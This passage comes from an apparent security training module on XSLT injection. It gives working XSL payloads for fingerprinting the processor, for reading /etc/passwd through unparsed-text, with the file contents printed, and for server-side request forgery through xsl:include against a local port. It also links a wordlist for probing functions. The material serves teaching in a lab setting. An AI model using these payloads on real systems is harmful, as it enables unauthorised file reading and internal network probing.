            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Artist<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
         <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
         <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Empire Burlesque<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Bob Dylan<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
         <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
   <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>The following file can be used to detect the underlying preprocessor.</p>
<p><strong>detection.xsl</strong></p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"1.0"</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">xsl:output</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"html"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">"/"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>XSLT identification<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Version:<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">"system-property('xsl:version')"</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Vendor:<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">"system-property('xsl:vendor')"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Vendor URL:<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">"system-property('xsl:vendor-url')"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span>
</code></pre>
<p>Let us now run the previous command, but this time, using the detection.xsl file.</p>
<p><strong>Transformation through the terminal</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ saxonb-xslt -xs<span class="hljs-variable">l:detection</span>.xsl catalogue.xml

Warnin<span class="hljs-variable">g:</span> at xs<span class="hljs-variable">l:stylesheet</span> <span class="hljs-keyword">on</span> <span class="hljs-built_in">line</span> <span class="hljs-number">2</span> column <span class="hljs-number">80</span> of detection.xs<span class="hljs-variable">l:</span>
  Running <span class="hljs-keyword">an</span> XSLT <span class="hljs-number">1.0</span> stylesheet with <span class="hljs-keyword">an</span> XSLT <span class="hljs-number">2.0</span> processor
<span class="hljs-symbol">&lt;h2&gt;</span>XSLT identification&lt;/h2&gt;<span class="hljs-symbol">&lt;b&gt;</span>Version:&lt;/<span class="hljs-keyword">b</span>&gt;<span class="hljs-number">2.0</span><span class="hljs-symbol">&lt;br&gt;</span><span class="hljs-symbol">&lt;b&gt;</span>Vendor:&lt;/<span class="hljs-keyword">b</span>&gt;SAXON <span class="hljs-number">9.1</span>.<span class="hljs-number">0.8</span> from Saxonica<span class="hljs-symbol">&lt;br&gt;</span><span class="hljs-symbol">&lt;b&gt;</span>Vendor URL:&lt;/<span class="hljs-keyword">b</span>&gt;http://www.saxonica.<span class="hljs-keyword">com</span>/<span class="hljs-symbol">&lt;br&gt;</span>
</code></pre>
<p>Based on the preprocessor, we can go to the XSLT documentation for this version to identify functions of interest, such as the below.</p>
<ul>
<li><code>unparsed-text</code> can be used to read local files.</li>
</ul>
<p><strong>readfile.xsl</strong></p>
<pre><code class="lang-xml">&lt;xs<span class="hljs-variable">l:stylesheet</span> xmln<span class="hljs-variable">s:xsl</span>=<span class="hljs-string">"http://www.w3.org/1999/XSL/Transform"</span> xmln<span class="hljs-variable">s:abc</span>=<span class="hljs-string">"http://php.net/xsl"</span> <span class="hljs-keyword">version</span>=<span class="hljs-string">"1.0"</span>&gt;
&lt;xs<span class="hljs-variable">l:template</span> <span class="hljs-keyword">match</span>=<span class="hljs-string">"/"</span>&gt;
&lt;xs<span class="hljs-variable">l:value</span>-of select=<span class="hljs-string">"unparsed-text('/etc/passwd', 'utf-8')"</span>/&gt;
&lt;/xs<span class="hljs-variable">l:template</span>&gt;
&lt;/xs<span class="hljs-variable">l:stylesheet</span>&gt;
</code></pre>
<p><strong>Transformation through the terminal</strong></p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ saxonb-xslt -<span class="hljs-string">xsl:</span>readfile.xsl catalogue.xml
<span class="hljs-symbol">
Warning:</span> at <span class="hljs-string">xsl:</span>stylesheet on line <span class="hljs-number">1</span> column <span class="hljs-number">111</span> of readfile.<span class="hljs-string">xsl:</span>
  Running an XSLT <span class="hljs-number">1.0</span> stylesheet with an XSLT <span class="hljs-number">2.0</span> processor
&lt;?xml version="1.0" encoding="UTF-8"?&gt;root:<span class="hljs-string">x:</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-string">root:</span><span class="hljs-regexp">/root:/</span>usr<span class="hljs-regexp">/bin/</span>zsh
<span class="hljs-string">daemon:</span><span class="hljs-string">x:</span><span class="hljs-number">1</span>:<span class="hljs-number">1</span>:<span class="hljs-string">daemon:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">sbin:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">bin:</span><span class="hljs-string">x:</span><span class="hljs-number">2</span>:<span class="hljs-number">2</span>:<span class="hljs-string">bin:</span><span class="hljs-regexp">/bin:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">sys:</span><span class="hljs-string">x:</span><span class="hljs-number">3</span>:<span class="hljs-number">3</span>:<span class="hljs-string">sys:</span><span class="hljs-regexp">/dev:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">sync:</span><span class="hljs-string">x:</span><span class="hljs-number">4</span>:<span class="hljs-number">65534</span>:<span class="hljs-string">sync:</span><span class="hljs-regexp">/bin:/</span>bin/sync
<span class="hljs-string">games:</span><span class="hljs-string">x:</span><span class="hljs-number">5</span>:<span class="hljs-number">60</span>:<span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">man:</span><span class="hljs-string">x:</span><span class="hljs-number">6</span>:<span class="hljs-number">12</span>:<span class="hljs-string">man:</span><span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/man:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">lp:</span><span class="hljs-string">x:</span><span class="hljs-number">7</span>:<span class="hljs-number">7</span>:<span class="hljs-string">lp:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/lpd:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">mail:</span><span class="hljs-string">x:</span><span class="hljs-number">8</span>:<span class="hljs-number">8</span>:<span class="hljs-string">mail:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">mail:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">news:</span><span class="hljs-string">x:</span><span class="hljs-number">9</span>:<span class="hljs-number">9</span>:<span class="hljs-string">news:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/news:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">uucp:</span><span class="hljs-string">x:</span><span class="hljs-number">10</span>:<span class="hljs-number">10</span>:<span class="hljs-string">uucp:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/uucp:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">proxy:</span><span class="hljs-string">x:</span><span class="hljs-number">13</span>:<span class="hljs-number">13</span>:<span class="hljs-string">proxy:</span><span class="hljs-regexp">/bin:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
www-<span class="hljs-string">data:</span><span class="hljs-string">x:</span><span class="hljs-number">33</span>:<span class="hljs-number">33</span>:www-<span class="hljs-string">data:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">www:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
&lt;SNIP&gt;
</code></pre>
<ul>
<li><code>xsl:include</code> can be used to perform SSRF</li>
</ul>
<p>We can also mount SSRF attacks if we have control over the transformation.</p>
<p><strong>ssrf.xsl</strong></p>
<pre><code class="lang-xml">&lt;xs<span class="hljs-variable">l:stylesheet</span> xmln<span class="hljs-variable">s:xsl</span>=<span class="hljs-string">"http://www.w3.org/1999/XSL/Transform"</span> xmln<span class="hljs-variable">s:abc</span>=<span class="hljs-string">"http://php.net/xsl"</span> <span class="hljs-keyword">version</span>=<span class="hljs-string">"1.0"</span>&gt;
&lt;xs<span class="hljs-variable">l:include</span> href=<span class="hljs-string">"http://127.0.0.1:5000/xslt"</span>/&gt;
&lt;xs<span class="hljs-variable">l:template</span> <span class="hljs-keyword">match</span>=<span class="hljs-string">"/"</span>&gt;
&lt;/xs<span class="hljs-variable">l:template</span>&gt;
&lt;/xs<span class="hljs-variable">l:stylesheet</span>&gt;
</code></pre>
<p><strong>Transformation through the terminal</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ saxonb-xslt -xsl:ssrf.xsl catalogue.xml

Warning: <span class="hljs-keyword">at</span> xsl:stylesheet <span class="hljs-keyword">on</span> <span class="hljs-title">line</span> <span class="hljs-title">1</span> <span class="hljs-title">column</span> <span class="hljs-title">111</span> <span class="hljs-title">of</span> <span class="hljs-title">ssrf</span>.<span class="hljs-title">xsl</span>:
  Running <span class="hljs-keyword">an</span> XSLT <span class="hljs-number">1.0</span> stylesheet <span class="hljs-keyword">with</span> <span class="hljs-keyword">an</span> XSLT <span class="hljs-number">2.0</span> processor
Error <span class="hljs-keyword">at</span> xsl:<span class="hljs-built_in">include</span> <span class="hljs-keyword">on</span> <span class="hljs-title">line</span> <span class="hljs-title">2</span> <span class="hljs-title">column</span> <span class="hljs-title">49</span> <span class="hljs-title">of</span> <span class="hljs-title">ssrf</span>.<span class="hljs-title">xsl</span>:
  XTSE0165: java.io.FileNotFoundException: <span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">5000</span>/xslt
Failed <span class="hljs-built_in">to</span> compile stylesheet. <span class="hljs-number">1</span> error detected.
</code></pre>
<pre><code class="lang-shell-session">root@htb[/htb]$ saxonb-xslt -xsl:ssrf.xsl catalogue.xml

Warning: <span class="hljs-keyword">at</span> xsl:stylesheet <span class="hljs-keyword">on</span> line <span class="hljs-number">1</span> column <span class="hljs-number">111</span> <span class="hljs-keyword">of</span> ssrf.xsl:
  Running an XSLT <span class="hljs-number">1.0</span> stylesheet <span class="hljs-keyword">with</span> an XSLT <span class="hljs-number">2.0</span> processor
Error <span class="hljs-keyword">at</span> xsl:include <span class="hljs-keyword">on</span> line <span class="hljs-number">2</span> column <span class="hljs-number">49</span> <span class="hljs-keyword">of</span> ssrf.xsl:
  XTSE0165: java.net.ConnectException: Connection refused (Connection refused)
Failed <span class="hljs-keyword">to</span> compile stylesheet. <span class="hljs-number">1</span> <span class="hljs-keyword">error</span> detected.
</code></pre>
<p>Check the different responses above when we hit an open or closed port. If you want to try this yourself in Pwnbox or a local machine, try executing the <code>saxonb-xslt</code> command above one time with nothing listening on port 5000 and one time with an HTTP server listening on port 5000 (<code>sudo python3 -m http.server 5000</code> in a separate tab or terminal).</p>
<p>We presented some tech-stack-identification XSL files at the beginning of this section. Below is one more, larger than the previous ones. Try using it to reproduce the example above.</p>
<p><strong>fingerprinting.xsl</strong></p>
<pre><code class="lang-xml">&lt;?xml <span class="hljs-keyword">version</span>=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"ISO-8859-1"</span>?&gt;
&lt;xs<span class="hljs-variable">l:stylesheet</span> <span class="hljs-keyword">version</span>=<span class="hljs-string">"1.0"</span> xmln<span class="hljs-variable">s:xsl</span>=<span class="hljs-string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;
&lt;xs<span class="hljs-variable">l:template</span> <span class="hljs-keyword">match</span>=<span class="hljs-string">"/"</span>&gt;
 Version: &lt;xs<span class="hljs-variable">l:value</span>-of select=<span class="hljs-string">"system-property('xsl:version')"</span> /&gt;&lt;<span class="hljs-keyword">br</span> /&gt;
 Vendor: &lt;xs<span class="hljs-variable">l:value</span>-of select=<span class="hljs-string">"system-property('xsl:vendor')"</span> /&gt;&lt;<span class="hljs-keyword">br</span> /&gt;
 Vendor URL: &lt;xs<span class="hljs-variable">l:value</span>-of select=<span class="hljs-string">"system-property('xsl:vendor-url')"</span> /&gt;&lt;<span class="hljs-keyword">br</span> /&gt;
 &lt;xs<span class="hljs-variable">l:if</span> test=<span class="hljs-string">"system-property('xsl:product-name')"</span>&gt;
 Product Name: &lt;xs<span class="hljs-variable">l:value</span>-of select=<span class="hljs-string">"system-property('xsl:product-name')"</span> /&gt;&lt;<span class="hljs-keyword">br</span> /&gt;
 &lt;/xs<span class="hljs-variable">l:if</span>&gt;
 &lt;xs<span class="hljs-variable">l:if</span> test=<span class="hljs-string">"system-property('xsl:product-version')"</span>&gt;
 Product Version: &lt;xs<span class="hljs-variable">l:value</span>-of select=<span class="hljs-string">"system-property('xsl:product-version')"</span> /&gt;&lt;<span class="hljs-keyword">br</span> /&gt;
 &lt;/xs<span class="hljs-variable">l:if</span>&gt;
 &lt;xs<span class="hljs-variable">l:if</span> test=<span class="hljs-string">"system-property('xsl:is-schema-aware')"</span>&gt;
 Is Schema Aware ?: &lt;xs<span class="hljs-variable">l:value</span>-of select=<span class="hljs-string">"system-property('xsl:is-schema-aware')"</span> /&gt;&lt;<span class="hljs-keyword">br</span> /&gt;
 &lt;/xs<span class="hljs-variable">l:if</span>&gt;
 &lt;xs<span class="hljs-variable">l:if</span> test=<span class="hljs-string">"system-property('xsl:supports-serialization')"</span>&gt;
 Supports Serialization: &lt;xs<span class="hljs-variable">l:value</span>-of select=<span class="hljs-string">"system-property('xsl:supportsserialization')"</span>
/&gt;&lt;<span class="hljs-keyword">br</span> /&gt;
 &lt;/xs<span class="hljs-variable">l:if</span>&gt;
 &lt;xs<span class="hljs-variable">l:if</span> test=<span class="hljs-string">"system-property('xsl:supports-backwards-compatibility')"</span>&gt;
 Supports Backwards Compatibility: &lt;xs<span class="hljs-variable">l:value</span>-of select=<span class="hljs-string">"system-property('xsl:supportsbackwards-compatibility')"</span>
/&gt;&lt;<span class="hljs-keyword">br</span> /&gt;
 &lt;/xs<span class="hljs-variable">l:if</span>&gt;
&lt;/xs<span class="hljs-variable">l:template</span>&gt;
&lt;/xs<span class="hljs-variable">l:stylesheet</span>&gt;
</code></pre>
<p><strong>Transformation through the terminal</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ saxonb-xslt -xs<span class="hljs-variable">l:fingerprinting</span>.xsl catalogue.xml

Warnin<span class="hljs-variable">g:</span> at xs<span class="hljs-variable">l:stylesheet</span> <span class="hljs-keyword">on</span> <span class="hljs-built_in">line</span> <span class="hljs-number">2</span> column <span class="hljs-number">80</span> of fingerprinting.xs<span class="hljs-variable">l:</span>
  Running <span class="hljs-keyword">an</span> XSLT <span class="hljs-number">1.0</span> stylesheet with <span class="hljs-keyword">an</span> XSLT <span class="hljs-number">2.0</span> processor
&lt;?xml <span class="hljs-keyword">version</span>=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;
 Version: <span class="hljs-number">2.0</span>&lt;<span class="hljs-keyword">br</span>/&gt;
 Vendor: SAXON <span class="hljs-number">9.1</span>.<span class="hljs-number">0.8</span> from Saxonica&lt;<span class="hljs-keyword">br</span>/&gt;
 Vendor URL: http://www.saxonica.<span class="hljs-keyword">com</span>/&lt;<span class="hljs-keyword">br</span>/&gt;
 Product Name: SAXON&lt;<span class="hljs-keyword">br</span>/&gt;
 Product Version: <span class="hljs-number">9.1</span>.<span class="hljs-number">0.8</span>&lt;<span class="hljs-keyword">br</span>/&gt;
 Is Schema Aware ?: <span class="hljs-keyword">no</span>&lt;<span class="hljs-keyword">br</span>/&gt;
 Supports Serialization: &lt;<span class="hljs-keyword">br</span>/&gt;
 Supports Backwards Compatibility: &lt;<span class="hljs-keyword">br</span>/&gt;
</code></pre>
<p>We can also use the following <a href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt">wordlist</a> for brute-forcing functionality available in target applications.</p>
